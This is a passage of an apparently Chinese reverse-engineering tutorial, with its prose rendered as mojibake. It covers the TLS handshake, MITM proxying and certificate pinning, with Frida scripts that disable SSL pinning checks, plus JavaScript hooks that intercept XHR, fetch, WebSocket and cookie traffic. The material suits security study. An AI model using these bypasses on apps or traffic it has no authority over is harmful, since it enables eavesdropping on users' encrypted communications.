<li><strong>é€†å‘</strong>: ç›´æ¥æŠŠ URL é‡Œçš„ callback æ”¹æˆä½ è‡ªå·±çš„å‡½æ•°åï¼Œæˆ–è€…ç›´æ¥è¯·æ±‚æ‹¿åˆ° JS ä»£ç é‡Œé¢å°±æ˜¯æ•°æ®ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>SOP æ˜¯æµè§ˆå™¨çš„â€œå›´å¢™â€ï¼ŒCORS æ˜¯å¢™ä¸Šçš„â€œé—¨â€ã€‚</p>
<ul>
<li><strong>æ­£å‘å¼€å‘</strong>: é…ç½®æœåŠ¡å™¨å¼€é—¨ã€‚</li>
<li><strong>é€†å‘åˆ†æ</strong>: æ—¢ç„¶å¢™æ˜¯æµè§ˆå™¨å»ºçš„ï¼Œé‚£ä¸ç®¡æ˜¯å…³æ‰æµè§ˆå™¨çš„å¢™ï¼ˆå¯åŠ¨å‚æ•°ï¼‰ï¼Œè¿˜æ˜¯éª—æœåŠ¡å™¨æˆ‘æ˜¯è‡ªå·±äººï¼ˆä»£ç†ä¿®æ”¹ Originï¼‰ï¼Œç›®æ ‡éƒ½æ˜¯ä¸ºäº†è®©æ•°æ®æµé€šã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-13">
                                                <h2>[R12] TLS/SSL Handshake</h2>
                                                <h1>R12: TLS/SSL æ¡æ‰‹è¿‡ç¨‹</h1>
<h2>æ¦‚è¿°</h2>
<p>åœ¨ HTTPS é€šä¿¡ä¸­ï¼ŒTLS/SSL æ¡æ‰‹æ˜¯å»ºç«‹å®‰å…¨è¿æ¥çš„ç¬¬ä¸€ä¸ªç¯èŠ‚ã€‚å¯¹äºé€†å‘å·¥ç¨‹ï¼Œç†è§£æ¡æ‰‹è¿‡ç¨‹æ˜¯ç ´è§£ SSL Pinningï¼ˆè¯ä¹¦å›ºå®šï¼‰å’Œè¿›è¡Œæµé‡è§£å¯†ï¼ˆMITMï¼‰çš„åŸºç¡€ã€‚</p>
<hr />
<h2>TLS 1.2 æ¡æ‰‹æµç¨‹ï¼ˆè¯¦ç»†ï¼‰</h2>
<h3>æ¡æ‰‹åºåˆ—å›¾</h3>
<pre><code class="language-mermaid">sequenceDiagram
    participant Client as å®¢æˆ·ç«¯
    participant Server as æœåŠ¡å™¨

    Note over Client,Server: é˜¶æ®µ 1: åå•†åŠ å¯†å‚æ•°
    Client-&gt;&gt;Server: 1. Client Hello&lt;br/&gt;- TLS ç‰ˆæœ¬&lt;br/&gt;- åŠ å¯†å¥—ä»¶åˆ—è¡¨&lt;br/&gt;- å®¢æˆ·ç«¯éšæœºæ•° (Random1)&lt;br/&gt;- SNI æ‰©å±•

    Server-&gt;&gt;Client: 2. Server Hello&lt;br/&gt;- é€‰æ‹©çš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- æœåŠ¡å™¨éšæœºæ•° (Random2)
    Server-&gt;&gt;Client: 3. Certificate&lt;br/&gt;- æœåŠ¡å™¨è¯ä¹¦é“¾
    Server-&gt;&gt;Client: 4. Server Hello Done

    Note over Client,Server: é˜¶æ®µ 2: å¯†é’¥äº¤æ¢ä¸éªŒè¯
    Note over Client: éªŒè¯æœåŠ¡å™¨è¯ä¹¦&lt;br/&gt;- æ£€æŸ¥è¯ä¹¦é“¾&lt;br/&gt;- éªŒè¯ç­¾å&lt;br/&gt;- æ£€æŸ¥æœ‰æ•ˆæœŸ

    Note over Client: ç”Ÿæˆ Pre-Master Secret
    Client-&gt;&gt;Server: 5. Client Key Exchange&lt;br/&gt;- ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†çš„&lt;br/&gt;Pre-Master Secret

    Note over Client: è®¡ç®— Master Secret&lt;br/&gt;= f(Random1, Random2,&lt;br/&gt;Pre-Master Secret)
    Note over Server: è§£å¯† Pre-Master Secret&lt;br/&gt;è®¡ç®— Master Secret

    Client-&gt;&gt;Server: 6. Change Cipher Spec&lt;br/&gt;- é€šçŸ¥åˆ‡æ¢åˆ°åŠ å¯†æ¨¡å¼
    Client-&gt;&gt;Server: 7. Finished (åŠ å¯†)&lt;br/&gt;- æ¡æ‰‹æ¶ˆæ¯çš„ HMAC

    Server-&gt;&gt;Client: 8. Change Cipher Spec
    Server-&gt;&gt;Client: 9. Finished (åŠ å¯†)

    Note over Client,Server: é˜¶æ®µ 3: åŠ å¯†é€šä¿¡
    Client-&gt;&gt;Server: Application Data (åŠ å¯†)
    Server-&gt;&gt;Client: Application Data (åŠ å¯†)
</code></pre>
<h3>1. åå•†é˜¶æ®µ (Hello)</h3>
<ul>
<li><strong>Client Hello</strong>: å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶ (Cipher Suites)ã€TLS ç‰ˆæœ¬ã€éšæœºæ•° (Random1) ä»¥åŠæ‰©å±•å­—æ®µï¼ˆå¦‚ SNI æŒ‡æ˜åŸŸåï¼‰ã€‚<ul>
<li><strong>JA3 æŒ‡çº¹</strong>: è¿™é‡Œçš„ Client Hello ç‰¹å¾ï¼ˆåŠ å¯†å¥—ä»¶é¡ºåºã€æ‰©å±•å­—æ®µç­‰ï¼‰å¸¸è¢«ç”¨äºè¯†åˆ«å®¢æˆ·ç«¯æŒ‡çº¹ï¼ˆJA3ï¼‰ï¼Œç”¨äºåçˆ¬è™«ã€‚</li>
</ul>
</li>
<li><strong>Server Hello</strong>: æœåŠ¡å™¨é€‰æ‹©ä¸€ç»„åŠ å¯†å¥—ä»¶ï¼Œå‘é€è‡ªå·±çš„éšæœºæ•° (Random2) å’Œ <strong>æ•°å­—è¯ä¹¦</strong>ã€‚</li>
</ul>
<h3>2. éªŒè¯ä¸å¯†é’¥äº¤æ¢ (Key Exchange)</h3>
<ul>
<li><strong>è¯ä¹¦éªŒè¯</strong>: å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦æ˜¯å¦å¯ä¿¡ï¼ˆæ ¡éªŒè¯ä¹¦é“¾ã€ç­¾åã€æœ‰æ•ˆæœŸï¼‰ã€‚</li>
<li><strong>å¯†é’¥ç”Ÿæˆ</strong>: å®¢æˆ·ç«¯ç”Ÿæˆ&quot;é¢„ä¸»å¯†é’¥&quot; (Pre-Master Secret)ï¼Œç”¨æœåŠ¡å™¨è¯ä¹¦ä¸­çš„å…¬é’¥åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ã€‚<ul>
<li><em>æ³¨</em>: åœ¨ TLS 1.3 æˆ–ä½¿ç”¨äº† PFS (å®Œç¾å‰å‘ä¿å¯†) çš„ç®—æ³•ä¸­ï¼Œå¯†é’¥äº¤æ¢æœºåˆ¶æ›´å¤æ‚ï¼ˆDiffie-Hellmanï¼‰ï¼Œä¸ç›´æ¥ä¼ è¾“å¯†é’¥ã€‚</li>
</ul>
</li>
</ul>
<h3>3. åŠ å¯†é€šä¿¡ (Finished)</h3>
<ul>
<li>åŒæ–¹åˆ©ç”¨ Random1 + Random2 + Pre-Master Secret è®¡ç®—å‡ºæœ€ç»ˆçš„ <strong>Session Key</strong>ã€‚</li>
<li>åç»­æ•°æ®å…¨éƒ¨ç”¨ Session Key è¿›è¡Œå¯¹ç§°åŠ å¯†ä¼ è¾“ã€‚</li>
</ul>
<hr />
<h2>TLS 1.3 æ¡æ‰‹æµç¨‹ï¼ˆç®€åŒ–ï¼‰</h2>
<p>TLS 1.3 å¤§å¹…ç®€åŒ–äº†æ¡æ‰‹è¿‡ç¨‹ï¼Œå‡å°‘äº†å¾€è¿”æ¬¡æ•°ï¼ˆ1-RTTï¼‰ï¼š</p>
<pre><code class="language-mermaid">sequenceDiagram
    participant Client as å®¢æˆ·ç«¯
    participant Server as æœåŠ¡å™¨

    Note over Client,Server: TLS 1.3: 1-RTT æ¡æ‰‹

    Client-&gt;&gt;Server: Client Hello&lt;br/&gt;- æ”¯æŒçš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- å¯†é’¥å…±äº« (Key Share)&lt;br/&gt;- å®¢æˆ·ç«¯éšæœºæ•°&lt;br/&gt;- SNI æ‰©å±•

    Note over Server: é€‰æ‹©åŠ å¯†å¥—ä»¶&lt;br/&gt;è®¡ç®—å…±äº«å¯†é’¥&lt;br/&gt;ç”Ÿæˆä¼šè¯å¯†é’¥

    Server-&gt;&gt;Client: Server Hello&lt;br/&gt;- é€‰æ‹©çš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- å¯†é’¥å…±äº« (Key Share)&lt;br/&gt;- æœåŠ¡å™¨éšæœºæ•°
    Server-&gt;&gt;Client: {Encrypted Extensions}&lt;br/&gt;{Certificate}&lt;br/&gt;{Certificate Verify}&lt;br/&gt;{Finished}

    Note over Client: éªŒè¯è¯ä¹¦&lt;br/&gt;è®¡ç®—å…±äº«å¯†é’¥&lt;br/&gt;ç”Ÿæˆä¼šè¯å¯†é’¥

    Client-&gt;&gt;Server: {Finished}

    Note over Client,Server: å¼€å§‹åŠ å¯†é€šä¿¡
    Client-&gt;&gt;Server: {Application Data}
    Server-&gt;&gt;Client: {Application Data}
</code></pre>
<p><strong>TLS 1.3 ä¸»è¦æ”¹è¿›</strong>:</p>
<ul>
<li><strong>1-RTT</strong>: åªéœ€ä¸€æ¬¡å¾€è¿”å³å¯å»ºç«‹åŠ å¯†è¿æ¥ï¼ˆTLS 1.2 éœ€è¦ 2-RTTï¼‰</li>
<li><strong>0-RTT</strong>: æ¢å¤ä¼šè¯æ—¶å¯å®ç°é›¶å¾€è¿”ï¼ˆä½†æœ‰é‡æ”¾æ”»å‡»é£é™©ï¼‰</li>
<li><strong>å¯†é’¥äº¤æ¢</strong>: ä»…æ”¯æŒ PFS (å®Œç¾å‰å‘ä¿å¯†) ç®—æ³•ï¼Œå¦‚ ECDHE</li>
<li><strong>å»é™¤å¼±åŠ å¯†</strong>: ç§»é™¤ RSA å¯†é’¥äº¤æ¢ã€é™æ€ DH ç­‰ä¸å®‰å…¨ç®—æ³•</li>
</ul>
<hr />
<h2>é€†å‘ä¸­çš„å…³é”®ç‚¹</h2>
<h3>1. ä¸ºä»€ä¹ˆ Charles/Fiddler æŠ“ä¸åˆ° HTTPS åŒ…ï¼Ÿ</h3>
<p>å› ä¸ºä¸­é—´äººï¼ˆCharlesï¼‰å‘ç»™å®¢æˆ·ç«¯çš„æ˜¯ Charles è‡ªå·±ç­¾å‘çš„ä¼ªé€ è¯ä¹¦ã€‚</p>
<ul>
<li>å¦‚æœå®¢æˆ·ç«¯ï¼ˆAPP/æµè§ˆå™¨ï¼‰ä¸ä¿¡ä»» Charles çš„æ ¹è¯ä¹¦ï¼Œæ¡æ‰‹å°±ä¼šåœ¨&quot;è¯ä¹¦éªŒè¯&quot;é˜¶æ®µå¤±è´¥ï¼Œè¿æ¥æ–­å¼€ã€‚</li>
</ul>
<h4>MITM æ”»å‡»åŸç†å›¾</h4>
<pre><code class="language-mermaid">sequenceDiagram
    participant Client as å®¢æˆ·ç«¯&lt;br/&gt;(APP/æµè§ˆå™¨)
    participant Proxy as ä¸­é—´äººä»£ç†&lt;br/&gt;(Charles/Burp)
    participant Server as ç›®æ ‡æœåŠ¡å™¨

    Note over Client,Server: æ­£å¸¸ HTTPS è¿æ¥ï¼ˆæ— ä»£ç†ï¼‰
    Client-&gt;&gt;Server: ç›´æ¥å»ºç«‹ TLS è¿æ¥
    Server-&gt;&gt;Client: è¿”å›çœŸå®æœåŠ¡å™¨è¯ä¹¦
    Note over Client: éªŒè¯é€šè¿‡ï¼Œå»ºç«‹åŠ å¯†è¿æ¥

    Note over Client,Server: MITM æ”»å‡»åœºæ™¯
    Client-&gt;&gt;Proxy: Client Hello (è®¿é—® api.example.com)
    Proxy-&gt;&gt;Server: è½¬å‘ Client Hello
    Server-&gt;&gt;Proxy: Server Hello + çœŸå®è¯ä¹¦

    Note over Proxy: ç”Ÿæˆä¼ªé€ è¯ä¹¦&lt;br/&gt;- ç­¾å‘è€…: Charles CA&lt;br/&gt;- ä¸»é¢˜: api.example.com

    Proxy-&gt;&gt;Client: è¿”å›ä¼ªé€ è¯ä¹¦

    alt å®¢æˆ·ç«¯æœªä¿¡ä»» Charles CA
        Note over Client: âŒ è¯ä¹¦éªŒè¯å¤±è´¥&lt;br/&gt;è¿æ¥ä¸­æ–­
    else å®¢æˆ·ç«¯å·²ä¿¡ä»» Charles CA
        Note over Client: âœ… è¯ä¹¦éªŒè¯é€šè¿‡&lt;br/&gt;å»ºç«‹åŠ å¯†è¿æ¥
        Client-&gt;&gt;Proxy: åŠ å¯†æ•°æ® (ç”¨ä¼ªé€ è¯ä¹¦å…¬é’¥)
        Note over Proxy: ğŸ”“ è§£å¯†å®¢æˆ·ç«¯æ•°æ®&lt;br/&gt;ğŸ” æŸ¥çœ‹/ä¿®æ”¹&lt;br/&gt;ğŸ”’ é‡æ–°åŠ å¯†
        Proxy-&gt;&gt;Server: è½¬å‘åˆ°æœåŠ¡å™¨ (ç”¨çœŸå®è¯ä¹¦)
        Server-&gt;&gt;Proxy: åŠ å¯†å“åº”
        Note over Proxy: ğŸ”“ è§£å¯†æœåŠ¡å™¨å“åº”&lt;br/&gt;ğŸ” æŸ¥çœ‹/ä¿®æ”¹&lt;br/&gt;ğŸ”’ é‡æ–°åŠ å¯†
        Proxy-&gt;&gt;Client: è¿”å›ç»™å®¢æˆ·ç«¯
    end
</code></pre>
<h3>2. Certificate Pinning (è¯ä¹¦å›ºå®š)</h3>
<p>ä¸ºäº†é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œè®¸å¤š APP å†…ç½®äº†æœåŠ¡å™¨è¯ä¹¦çš„æŒ‡çº¹ï¼ˆHashï¼‰ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶ï¼Œä¸ä»…éªŒè¯è¯ä¹¦æ˜¯å¦å¯ä¿¡ï¼Œè¿˜è¦æ¯”å¯¹å…¬é’¥ Hash æ˜¯å¦ä¸å†…ç½®çš„ä¸€è‡´ã€‚å¦‚æœä»…ä»…åœ¨ç³»ç»Ÿä¸­å®‰è£…äº† Charles è¯ä¹¦ï¼ŒAPP å‘ç° Hash ä¸åŒ¹é…ï¼Œä¾ç„¶ä¼šæŠ¥é”™ã€‚</p>
<h4>Certificate Pinning éªŒè¯æµç¨‹</h4>
<pre><code class="language-mermaid">flowchart TD
    A[å¼€å§‹ TLS æ¡æ‰‹] --&gt; B[æ¥æ”¶æœåŠ¡å™¨è¯ä¹¦]
    B --&gt; C{ç³»ç»Ÿè¯ä¹¦é“¾éªŒè¯}
    C --&gt;|å¤±è´¥| D[âŒ è¿æ¥å¤±è´¥]
    C --&gt;|é€šè¿‡| E{Certificate Pinning&lt;br/&gt;å¯ç”¨?}

    E --&gt;|æœªå¯ç”¨| F[âœ… å»ºç«‹è¿æ¥]
    E --&gt;|å·²å¯ç”¨| G[æå–è¯ä¹¦å…¬é’¥]

    G --&gt; H[è®¡ç®—å…¬é’¥ Hash&lt;br/&gt;SHA256/SHA1]
    H --&gt; I{Hash æ˜¯å¦åŒ¹é…&lt;br/&gt;å†…ç½®æŒ‡çº¹?}

    I --&gt;|åŒ¹é…| F
    I --&gt;|ä¸åŒ¹é…| J[âŒ Pinning éªŒè¯å¤±è´¥&lt;br/&gt;è¿æ¥ä¸­æ–­]

    style D fill:#ff6b6b
    style F fill:#51cf66
    style J fill:#ff6b6b
</code></pre>
<h4>Pinning å®ç°ç¤ºä¾‹</h4>
<p><strong>Android (OkHttp)</strong>:</p>
<pre><code class="language-java">// å†…ç½®è¯ä¹¦å…¬é’¥ Hash
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add(&quot;api.example.com&quot;, &quot;sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;)
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
</code></pre>
<p><strong>iOS (Swift)</strong>:</p>
<pre><code class="language-swift">func urlSession(_ session: URLSession,
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -&gt; Void) {

    guard let serverTrust = challenge.protectionSpace.serverTrust,
          let certificate = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
        completionHandler(.cancelAuthenticationChallenge, nil)
        return
    }

    // è®¡ç®—å…¬é’¥ Hash
    let serverPublicKeyHash = sha256(certificate)
    let pinnedHash = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;

    if serverPublicKeyHash == pinnedHash {
        completionHandler(.useCredential, URLCredential(trust: serverTrust))
    } else {
        completionHandler(.cancelAuthenticationChallenge, nil)
    }
}
</code></pre>
<h4>[Reverse Engineering Context] ç»•è¿‡ Pinning</h4>
<p>Pinning é€»è¾‘é€šå¸¸åœ¨ç½‘ç»œåº“ï¼ˆOkHttp, AFNetworkingï¼‰æˆ– Native å±‚ï¼ˆOpenSSL, BoringSSLï¼‰çš„å›è°ƒä¸­ã€‚</p>
<pre><code class="language-mermaid">flowchart TD
    A[è¯†åˆ« Pinning æœºåˆ¶] --&gt; B{Pinning å±‚çº§}

    B --&gt;|Java/Kotlin å±‚| C[Hook ç½‘ç»œåº“]
    B --&gt;|Native å±‚| D[Hook SSL åº“]
    B --&gt;|å¤šå±‚é˜²æŠ¤| E[ç»„åˆç»•è¿‡]

    C --&gt; C1[æ–¹æ¡ˆ 1: Hook TrustManager]
    C1 --&gt; C1A[&quot;Hook checkServerTrusted()&lt;br/&gt;ç›´æ¥è¿”å› true&quot;]

    C --&gt; C2[æ–¹æ¡ˆ 2: Hook OkHttp]
    C2 --&gt; C2A[&quot;Hook CertificatePinner.check()&lt;br/&gt;è·³è¿‡éªŒè¯&quot;]

    D --&gt; D1[æ–¹æ¡ˆ 3: Hook OpenSSL]
    D1 --&gt; D1A[&quot;Hook SSL_CTX_set_verify()&lt;br/&gt;ç¦ç”¨éªŒè¯å›è°ƒ&quot;]

    D --&gt; D2[æ–¹æ¡ˆ 4: Hook BoringSSL]
    D2 --&gt; D2A[&quot;Hook ssl_verify_peer_cert()&lt;br/&gt;å¼ºåˆ¶è¿”å›æˆåŠŸ&quot;]

    E --&gt; E1[Frida å¤šç‚¹ Hook]
    E1 --&gt; E1A[åŒæ—¶ Hook Java + Native å±‚]

    C1A --&gt; F[âœ… ç»•è¿‡æˆåŠŸ]
    C2A --&gt; F
    D1A --&gt; F
    D2A --&gt; F
    E1A --&gt; F

    style F fill:#51cf66
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ul>
<li><p><strong>Android (Java å±‚)</strong>:
Hook <code>javax.net.ssl.X509TrustManager.checkServerTrusted</code>ï¼Œè®©å…¶æ°¸è¿œä¸æŠ›å¼‚å¸¸ã€‚</p>
<pre><code class="language-javascript">// Frida Hook ç¤ºä¾‹
Java.perform(function () {
  var TrustManager = Java.use(&quot;javax.net.ssl.X509TrustManager&quot;);
  TrustManager.checkServerTrusted.implementation = function (
    chain,
    authType
  ) {
    console.log(&quot;[+] Bypassing SSL Pinning - TrustManager&quot;);
    // ç›´æ¥è¿”å›ï¼Œä¸æŠ›å‡ºå¼‚å¸¸
  };
});
</code></pre>
</li>
<li><p><strong>Native å±‚ (so ä¿®æ”¹)</strong>:
Hook SSL åº“çš„éªŒè¯å‡½æ•°ï¼Œå¦‚ <code>SSL_CTX_set_custom_verify</code> æˆ–ç›´æ¥ Hook æ¡æ‰‹ç»“æœã€‚</p>
<pre><code class="language-javascript">// Hook OpenSSL
Interceptor.attach(
  Module.findExportByName(&quot;libssl.so&quot;, &quot;SSL_CTX_set_verify&quot;),
  {
    onEnter: function (args) {
      console.log(&quot;[+] SSL_CTX_set_verify called&quot;);
      // å°† verify_callback è®¾ç½®ä¸º NULLï¼Œç¦ç”¨éªŒè¯
      args[1] = ptr(0);
    },
  }
);
</code></pre>
</li>
</ul>
<h3>3. åŒå‘è®¤è¯ (Mutual TLS / mTLS)</h3>
<p>æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯ä¹Ÿå‡ºç¤ºè¯ä¹¦ã€‚</p>
<ul>
<li><strong>è¡¨ç°</strong>: æŠ“åŒ…çœ‹åˆ°æœåŠ¡å™¨è¿”å› <code>400 Bad Request (No Client Certificate)</code>ã€‚</li>
<li><strong>é€†å‘</strong>: éœ€è¦ä» APK/IPA æˆ–è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿä¸­æå–å‡º <code>.p12</code> æˆ– <code>.bks</code> å®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶å¯¼å…¥åˆ° Charles/Burp ä¸­ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>TLS æ¡æ‰‹æ˜¯ HTTP ä¹‹å‰çš„â€œæš—å·å¯¹æ¥â€ã€‚</p>
<ul>
<li><strong>æ­£å‘</strong>: ä¿è¯æ•°æ®ä¸è¢«çªƒå¬å’Œç¯¡æ”¹ã€‚</li>
<li><strong>é€†å‘</strong>: æˆ‘ä»¬å°±æ˜¯é‚£ä¸ªâ€œçªƒå¬è€…â€å’Œâ€œç¯¡æ”¹è€…â€ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„å·¥ä½œé‡å¿ƒæ˜¯è®©è‡ªå·±æˆä¸ºå®¢æˆ·ç«¯ä¿¡ä»»çš„â€œä¸­é—´äººâ€ï¼ˆç»•è¿‡è¯ä¹¦æ ¡éªŒ/Pinningï¼‰ï¼Œæˆ–è€…ç›´æ¥æ‹¿åˆ°é€šä¿¡å¯†é’¥ï¼ˆHook OpenSSLï¼‰ã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-14">
                                                <h2>[R13] Web API And Ajax</h2>
                                                <h1>R13: Web API ä¸ Ajax</h1>
<h2>æ¦‚è¿°</h2>
<p>Web API å’Œ Ajax æ˜¯ç°ä»£ Web åº”ç”¨çš„æ ¸å¿ƒã€‚å¯¹äºé€†å‘å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œç†è§£è¿™äº›æŠ€æœ¯æ˜¯æ‹¦æˆªç½‘ç»œè¯·æ±‚ã€åˆ†ææ•°æ®æµå‘ä»¥åŠç»•è¿‡æŸäº›å®‰å…¨æ£€æµ‹çš„åŸºç¡€ã€‚</p>
<hr />
<h2>Ajax ä¸ç½‘ç»œè¯·æ±‚</h2>
<h3>1. XMLHttpRequest (XHR)</h3>
<p>XHR æ˜¯ä¼ ç»Ÿçš„ Ajax å®ç°æ–¹å¼ï¼Œè™½ç„¶ Fetch API è¶Šæ¥è¶Šæµè¡Œï¼Œä½†è®¸å¤šè€é¡¹ç›®å’Œæ··æ·†ä»£ç ï¼ˆå¦‚åŠ å¯†åº“ï¼‰ä»åœ¨ä½¿ç”¨ XHRã€‚</p>
<h4>XHR ç”Ÿå‘½å‘¨æœŸä¸çŠ¶æ€</h4>
<p>XHR å¯¹è±¡é€šè¿‡ <code>readyState</code> å±æ€§è¡¨ç¤ºè¯·æ±‚çŠ¶æ€ï¼š</p>
<ul>
<li><code>0 (UNSENT)</code>: å¯¹è±¡å·²åˆ›å»ºï¼Œä½†æœªè°ƒç”¨ <code>open()</code>ã€‚</li>
<li><code>1 (OPENED)</code>: <code>open()</code> å·²è°ƒç”¨ã€‚</li>
<li><code>2 (HEADERS_RECEIVED)</code>: <code>send()</code> å·²è°ƒç”¨ï¼Œå¤´éƒ¨å’ŒçŠ¶æ€å¯ç”¨ã€‚</li>
<li><code>3 (LOADING)</code>: ä¸‹è½½ä¸­ï¼Œ<code>responseText</code> åŒ…å«éƒ¨åˆ†æ•°æ®ã€‚</li>
<li><code>4 (DONE)</code>: ä¸‹è½½æ“ä½œå®Œæˆã€‚</li>
</ul>
<h4>[Reverse Engineering Context] Hook XHR</h4>
<p>åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ Hook <code>open</code> å’Œ <code>send</code> æ–¹æ³•æ¥æ‹¦æˆªè¯·æ±‚å‚æ•°å’Œä¿®æ”¹è¯·æ±‚ä½“ã€‚</p>
<pre><code class="language-javascript">(function () {
  let originalOpen = XMLHttpRequest.prototype.open;
  let originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (
    method,
    url,
    async,
    user,
    password
  ) {
    // è®°å½•æˆ–ä¿®æ”¹ URL/Method
    this._url = url; // ä¿å­˜ URL ä¾› send ä½¿ç”¨
    console.log(`[XHR Open] ${method} ${url}`);

    // è°ƒç”¨åŸå§‹æ–¹æ³•
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    // è®°å½•æˆ–ä¿®æ”¹è¯·æ±‚ä½“
    console.log(`[XHR Send] to ${this._url}:`, body);

    // å¦‚æœéœ€è¦ç›‘å¬å“åº”ï¼Œå¯ä»¥ç»‘å®š onreadystatechange
    this.addEventListener(&quot;readystatechange&quot;, function () {
      if (this.readyState === 4) {
        console.log(
          `[XHR Response] from ${this.responseURL}:`,
          this.responseText.slice(0, 100)
        );
      }
    });

    return originalSend.apply(this, arguments);
  };
})();
</code></pre>
<h3>2. Fetch API</h3>
<p>Fetch æ˜¯åŸºäº Promise çš„æ–°ä¸€ä»£ç½‘ç»œè¯·æ±‚ APIï¼Œè¯­æ³•æ›´ç®€æ´ï¼Œå¤„ç†æ–¹å¼ä¸ XHR ä¸åŒã€‚</p>
<h4>åŸºæœ¬ç”¨æ³•</h4>
<pre><code class="language-javascript">fetch(&quot;https://api.example.com/data&quot;, {
  method: &quot;POST&quot;,
  headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
  body: JSON.stringify({ id: 1 }),
})
  .then((response) =&gt; response.json()) // è§£æ JSON
  .then((data) =&gt; console.log(data));
</code></pre>
<h4>[Reverse Engineering Context] Hook Fetch</h4>
<p>Fetch æ˜¯å…¨å±€ <code>window</code> å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼ŒHook èµ·æ¥ç›¸å¯¹ç®€å•ã€‚</p>
<pre><code class="language-javascript">(function () {
  let originalFetch = window.fetch;

  window.fetch = async function (url, options) {
    console.log(`[Fetch] ${url}`, options);

    // ä¿®æ”¹è¯·æ±‚å‚æ•°
    if (url.includes(&quot;/api/sign&quot;)) {
      // options.headers['X-Modified'] = 'true';
    }

    // è°ƒç”¨åŸå§‹ fetch
    let response = await originalFetch(url, options);

    // æ‹¦æˆªå“åº”ï¼ˆæ³¨æ„ï¼šresponseæµåªèƒ½è¯»å–ä¸€æ¬¡ï¼Œéœ€è¦cloneï¼‰
    let clone = response.clone();
    clone.text().then((body) =&gt; {
      console.log(`[Fetch Response]`, body.slice(0, 100));
    });

    return response;
  };
})();
</code></pre>
<h3>3. WebSocket</h3>
<p>WebSocket æä¾›å…¨åŒå·¥é€šä¿¡é€šé“ã€‚é€†å‘ä¸­å¸¸ç”¨äºåˆ†æå®æ—¶æ•°æ®æµï¼ˆå¦‚ç›´æ’­å¼¹å¹•ã€è‚¡ç¥¨è¡Œæƒ…ã€æ¸¸æˆæ•°æ®ï¼‰ã€‚</p>
<h4>[Reverse Engineering Context] Hook WebSocket</h4>
<p>æ‹¦æˆª WebSocket çš„ <code>send</code> (å‘åŒ…) å’Œ <code>onmessage</code> (æ”¶åŒ…)ã€‚</p>
<pre><code class="language-javascript">(function () {
  let OriginalWebSocket = window.WebSocket;

  window.WebSocket = function (url, protocols) {
    let ws = new OriginalWebSocket(url, protocols);
    console.log(`[WebSocket] Connecting to ${url}`);

    // Hook å‘é€
    let originalSend = ws.send;
    ws.send = function (data) {
      console.log(`[WebSocket Send]`, data);
      return originalSend.apply(this, arguments);
    };

    // Hook æ¥æ”¶
    // WebSocket çš„ onmessage å±æ€§é€šå¸¸åœ¨å®ä¾‹åˆ›å»ºåè¢«èµ‹å€¼
    // ä½¿ç”¨ Object.defineProperty æ‹¦æˆª setter æ˜¯ä¸€ç§æ›´é€šç”¨çš„æ–¹æ³•
    let onmessageVal;
    Object.defineProperty(ws, &quot;onmessage&quot;, {
      configurable: true,
      enumerable: true,
      get() {
        return onmessageVal;
      },
      set(fn) {
        onmessageVal = function (event) {
          console.log(`[WebSocket Recv]`, event.data);
          return fn.apply(this, arguments);
        };
      },
    });

    return ws;
  };

  // å¤åˆ¶åŸå‹é“¾ï¼Œä¿æŒ instanceof æ£€æŸ¥é€šè¿‡
  window.WebSocket.prototype = OriginalWebSocket.prototype;
  window.WebSocket.CONNECTING = OriginalWebSocket.CONNECTING;
  // ... å…¶ä»–é™æ€å±æ€§
})();
</code></pre>
<hr />
<h2>å¸¸ç”¨ Web API</h2>
<h3>1. Storage API (å­˜å‚¨)</h3>
<p>Web åº”ç”¨å¸¸ç”¨æœ¬åœ°å­˜å‚¨æ¥ä¿å­˜ Session IDã€Token æˆ–åŠ å¯†å¯†é’¥ã€‚</p>
<ul>
<li><strong>localStorage / sessionStorage</strong>: é”®å€¼å¯¹å­˜å‚¨ã€‚<ul>
<li>é€†å‘å…³æ³¨ç‚¹ï¼š<code>localStorage.getItem('token')</code>ã€‚</li>
</ul>
</li>
<li><strong>Cookie</strong>: è¿™ä¸ªæ¯”è¾ƒç‰¹æ®Šï¼Œé€šå¸¸ä½œä¸º HTTP å¤´å‘é€ã€‚<ul>
<li>é€†å‘å…³æ³¨ç‚¹ï¼š<code>document.cookie</code> çš„è¯»å†™ã€‚Hook <code>document.cookie</code> çš„ setter å¯ä»¥è¿½è¸ª Cookie çš„ç”Ÿæˆä½ç½®ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="language-javascript">// Hook Cookie Setter
Object.defineProperty(document, &quot;cookie&quot;, {
  set: function (val) {
    console.log(&quot;[Cookie Set]&quot;, val);
